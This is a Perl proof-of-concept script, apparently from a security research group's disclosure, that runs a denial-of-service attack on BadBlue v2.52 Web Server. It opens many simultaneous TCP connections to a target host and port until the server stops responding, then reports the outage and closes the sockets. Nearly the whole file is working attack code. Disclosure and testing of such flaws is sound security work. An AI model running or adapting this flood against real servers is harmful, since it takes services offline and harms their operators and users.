#!/usr/bin/perl
##############################################################
# BadBlue v2.52 Web Server - Multiple Connections DoS POC Code
##############################################################
# BadBlue Web Server can not handle many simultaneous connects
# from the same host, and will lock up until the connects stop
##############################################################
# This Proof Of Concept Written By GulfTech Security Research
##############################################################

  use Strict;
  use Socket;
  use IO::Socket;

  my $host = $ARGV[0];
  my $port = $ARGV[1];
  my $stop = $ARGV[2];
  my $size = 1000;
  my $prot = getprotobyname('tcp');
  my $slep = $ARGV[3];

printf("================================================\n");
printf(" BadBlue v2.52 Web Server Denial Of Service POC \n");
printf("================================================\n");
printf("[*] Making %d Connections To %s \n", $stop , $host);

for ($i=1; $i<$stop; $i++)
{
  socket($i, PF_INET, SOCK_STREAM, $prot );
  my $dest = sockaddr_in ($port, inet_aton($host));
  connect($i, $dest);
}

  CheckServer($host, $i, $slep, $stop);
  KillThreads($stop);
  printf("[*] Exploit Attempt Unsuccesful");
  exit;

sub CheckServer($host, $i, $slep, $stop) {
   ($host, $i, $slep, $stop) = @_;
   $blank   = "\015\012" x 2;
   $request = "GET / HTTP/1.0".$blank;
   $remote  = IO::Socket::INET->new( Proto => "tcp",
                                     PeerAddr  => $host,
                                     PeerPort  => $port,
                                     Timeout   => '10000',
                                     Type      => SOCK_STREAM,
                                   );
   print $remote $request;
   unless ( <$remote> )
   {
      printf("[*] Host %s Has Been Successfully DoS'ed\n", $host);
      printf("[*] The Host Will Be Down For %d Seconds\n", $slep);
      sleep($slep);
      KillThreads($stop);
      exit;
   }
}

sub KillThreads($stop) {
$stop = @_;
printf("[*] Killing All active Connections");
for ($l=1; $l<$stop; $l++) {
   shutdown($l,2)|| die("Couldn't Shut Down Socket");
   $l++;
 }
}
